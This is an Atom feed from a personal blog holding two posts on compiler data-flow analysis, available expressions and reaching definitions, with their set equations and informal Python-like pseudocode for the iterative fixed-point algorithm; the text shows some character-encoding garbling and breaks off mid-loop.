<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-04-06T21:57:29+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">dyfâ€™s blog</title><subtitle>&quot;ä¸€åªçŒ«ï½&quot;</subtitle><author><name>dyf</name><email>dyf.auroa@gmail.com</email></author><entry><title type="html">Data Flow Analysis â€“ Available Expression</title><link href="http://localhost:4000/blog/avaliable-expression" rel="alternate" type="text/html" title="Data Flow Analysis -- Available Expression" /><published>2021-04-06T00:00:00+08:00</published><updated>2021-04-06T00:00:00+08:00</updated><id>http://localhost:4000/blog/avaliable-expression</id><content type="html" xml:base="http://localhost:4000/blog/avaliable-expression">&lt;h2 id=&quot;what-is-available-expression&quot;&gt;What is available expression&lt;/h2&gt;

&lt;p&gt;An expression &lt;em&gt;e&lt;/em&gt; is &lt;em&gt;avaliable&lt;/em&gt; at point &lt;em&gt;p&lt;/em&gt; in a procedure if and only if on every path from the entry to &lt;em&gt;p&lt;/em&gt;, &lt;em&gt;e&lt;/em&gt; is evaluated and not of its constituent subexpressions is redefined between that evaluation and &lt;em&gt;p&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;The Result of the analysis can be use for Common Expression Elimination.&lt;/p&gt;

&lt;h2 id=&quot;algorithm&quot;&gt;Algorithm&lt;/h2&gt;

&lt;p&gt;This analysis annotate each node &lt;em&gt;n&lt;/em&gt; in the &lt;strong&gt;CFG&lt;/strong&gt; with a set &lt;strong&gt;AvailIn(n)&lt;/strong&gt;, which contains the names of all expressions in the procedure that are available on entry to the block corresponding to &lt;em&gt;n&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;To compute the &lt;strong&gt;AvailIn(n)&lt;/strong&gt;, the compiler initially set:&lt;/p&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;AvailIn(n0) = \Phi&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;AvailIn(n) = \{all \,\, expressions \}, \forall n \neq n0&lt;/script&gt;

&lt;p&gt;The last expression means that we should set all bits of the &lt;strong&gt;AvailIn&lt;/strong&gt; (bit-vector) as 1.&lt;/p&gt;

&lt;p&gt;Next, it solves the following equations:&lt;/p&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;AvailIn(n) = \mathop{\cap}\limits_{m \in preds(n)} (DEExpr(m) \cup (AvailIn(m) \cap \overline{ExprKill(m)}))&lt;/script&gt;

&lt;p&gt;&lt;strong&gt;DEExpr(n)&lt;/strong&gt; is the set of downward exposed expression in &lt;em&gt;n&lt;/em&gt;. An expression &lt;em&gt;e&lt;/em&gt; in &lt;strong&gt;DEExpr(n)&lt;/strong&gt; if and only if &lt;em&gt;n&lt;/em&gt; evaluate &lt;em&gt;e&lt;/em&gt; and none of &lt;em&gt;eâ€™s&lt;/em&gt; operands is defined between the last evaluation of &lt;em&gt;e&lt;/em&gt; in &lt;em&gt;n&lt;/em&gt; and the end of &lt;em&gt;n&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;ExprKill(n)&lt;/strong&gt; contains all those expression â€œis killedâ€ by the definitions in &lt;em&gt;n&lt;/em&gt;. A expression is killed if one or more of its operands are redefined in the block.&lt;/p&gt;

&lt;p&gt;An expression &lt;em&gt;e&lt;/em&gt; is available on entry to &lt;em&gt;n&lt;/em&gt; if and only if it is available on exit from each of &lt;em&gt;n&lt;/em&gt;â€™s predecessors in the &lt;strong&gt;CFG&lt;/strong&gt;. As the equation states, an expression &lt;em&gt;e&lt;/em&gt; is available on exit from block &lt;em&gt;m&lt;/em&gt; if one of two conditions holds: either &lt;em&gt;e&lt;/em&gt; is downward exposed in &lt;em&gt;m&lt;/em&gt;, or it is available on entry to &lt;em&gt;m&lt;/em&gt; and is not killed in &lt;em&gt;m&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;AvailIn&lt;/strong&gt; sets can be used to perform global redundancy elimination, some times called &lt;em&gt;global common subexpression elimination&lt;/em&gt;.&lt;/p&gt;

&lt;h2 id=&quot;implemention&quot;&gt;Implemention&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;Gather initial information and initilize the bit-vector&lt;/li&gt;
  &lt;li&gt;Perform the iteration to approach the fixed point&lt;/li&gt;
&lt;/ol&gt;

&lt;ul&gt;
  &lt;li&gt;Gather initial information and initilize the bit-vector&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# assume CFG has N blocks
# numbered 0 to N - 1
&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;map&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stmt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;oprand_to_stmt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;InitBlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;statements&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AvailIn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# set all bits of the vector to 1
&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stmt&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;statements&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;oprand&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;oprands&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;oprand_to_stmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;insert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;oprand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stmt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DEExpr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Expr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IsDefine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stmt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ExprKill&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;oprand_to_stmt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stmt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DEExpr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DeleteIfExit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;oprand_to_stmt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stmt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;cfg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AvailIn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;N&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;InitBlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cfg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Solve the fixed point equations&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# assume CFG has N blocks
# numbered 0 to N - 1
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;GetAvailableExprOut&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cfg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;changed&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;true&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;changed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;changed&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;false&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;N&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;cfg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AvailableExprOut&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cfg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AvailableExprOut&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recompute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cfg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AvailableExprOut&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;changed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;changed&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;true&lt;/span&gt;        
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>dyf</name><email>dyf.auroa@gmail.com</email></author><category term="program analysis" /><summary type="html">What is available expression</summary></entry><entry><title type="html">Data Flow Analysis â€“ Reaching definition Analysis</title><link href="http://localhost:4000/blog/reaching-define" rel="alternate" type="text/html" title="Data Flow Analysis -- Reaching definition Analysis" /><published>2021-04-05T00:00:00+08:00</published><updated>2021-04-05T00:00:00+08:00</updated><id>http://localhost:4000/blog/reaching-define</id><content type="html" xml:base="http://localhost:4000/blog/reaching-define">&lt;p&gt;It has been a long time since I wrote the last blog, because I was preparing the Toefl and GRE exam ğŸ˜¢ (so hard). I reviewed the data flow analysis algoritms recently by watching the Li Yueâ€™s videos and reading &lt;em&gt;Engineer A Compiler&lt;/em&gt;. Here are some ideas.&lt;/p&gt;

&lt;h2 id=&quot;whats-the-reaching-definition&quot;&gt;Whatâ€™s the Reaching definition&lt;/h2&gt;

&lt;p&gt;In some case the compiler need to know that where the operand has been defined. To find a set of definitions that reach a blocl, the compilers can compute the &lt;em&gt;reaching definitions&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;The domain of the &lt;strong&gt;Reaches&lt;/strong&gt; is the set of definitions in the procedure. The definition &lt;em&gt;b&lt;/em&gt; of some vaiable &lt;em&gt;v&lt;/em&gt; reaches operation &lt;em&gt;i&lt;/em&gt; if and only if &lt;em&gt;i&lt;/em&gt; reads the value of &lt;em&gt;v&lt;/em&gt; and there exists a path that from &lt;em&gt;d&lt;/em&gt; to &lt;em&gt;i&lt;/em&gt; does not redefine &lt;em&gt;v&lt;/em&gt;.&lt;/p&gt;

&lt;h2 id=&quot;whats-the-use-of-reaching-definition&quot;&gt;Whatâ€™s the use of Reaching definition&lt;/h2&gt;

&lt;p&gt;We can build the define-use chain to perform the further optimization. Also, we can perform some easy checking such as &lt;em&gt;using uninitialized variables&lt;/em&gt;. We can add dummy definitions in the entry node. The uninitialized values are used if any dummy definitions reach a program point &lt;em&gt;p&lt;/em&gt;.&lt;/p&gt;

&lt;h2 id=&quot;algorithm&quot;&gt;Algorithm&lt;/h2&gt;

&lt;p&gt;The compiler annotates each node &lt;em&gt;n&lt;/em&gt; in the CFG with a set &lt;strong&gt;REACHES(n)&lt;/strong&gt;, computed as the a forward data-flow problem:&lt;/p&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;Reaches(n) = \Phi, \forall n&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;Reaches(n) = \mathop{\cup}\limits_{m \in preds(n)} (DEDef(m) \cup (Reaches(m) \cap \overline{DefKill(m)}))&lt;/script&gt;

&lt;p&gt;The &lt;strong&gt;DEDef&lt;/strong&gt; is the downward-exposed definitions in &lt;em&gt;m&lt;/em&gt;. &lt;strong&gt;DefKill(m)&lt;/strong&gt; contains all the definition points that are obscured by a definition of the same name in &lt;em&gt;m&lt;/em&gt;; &lt;em&gt;d&lt;/em&gt; in &lt;strong&gt;DefKill(m)&lt;/strong&gt; if &lt;em&gt;d&lt;/em&gt; defines some name &lt;em&gt;v&lt;/em&gt; and &lt;em&gt;m&lt;/em&gt; contains a definition that also defines &lt;em&gt;v&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;DEDef&lt;/strong&gt; and &lt;strong&gt;DefKill&lt;/strong&gt; are both defined over the set of definition points, but computing each of them requires a mapping from names (variables and compiler-generated temporatries) to definition points.&lt;/p&gt;

&lt;h2 id=&quot;using-iteration-algorithm-to-approach-the-fixed-point&quot;&gt;Using iteration algorithm to approach the fixed point&lt;/h2&gt;

&lt;p&gt;Just like the liveness analysis, we can use the iteration method to reach the fixed point. For one procedure, we can implement the algorithm by three steps:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Build the cfg&lt;/li&gt;
  &lt;li&gt;Gather initial information: compute the &lt;strong&gt;DEDef&lt;/strong&gt; and the &lt;strong&gt;DefKill&lt;/strong&gt; and build a map of the name to defination points with a pass&lt;/li&gt;
  &lt;li&gt;Perform the iteration to approach the fixed point&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The pseudo codes are following:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Gather the initial information&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# used to record the oprands and its owners
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;multi_map&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;statement&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;definition_info&lt;/span&gt; 

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Reaches&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;null&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DefKill&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;null&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;statements&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IsDefineStmt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;definition_info&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;insert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# build map
&lt;/span&gt;            &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DefKill&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;                  &lt;span class=&quot;c1&quot;&gt;# build DefKill set
&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;oprand&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;oprands&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;oprand&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DefKill&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DEDef&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;              &lt;span class=&quot;c1&quot;&gt;# build DEDef set
&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Perform the iteration algorithm&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# assume CFG has N blocks
# numbered 0 to N - 1
&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;GetReachingDefinitionOutPass&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cfg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bb&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cfg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;bb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ReachingDefOut&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;null&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;changed&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;true&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;changed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;changed&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;false&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;N&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;cfg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ReachingDefOut&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cfg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ReachingDefOut&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recompute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cfg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ReachingDefOut&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;changed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
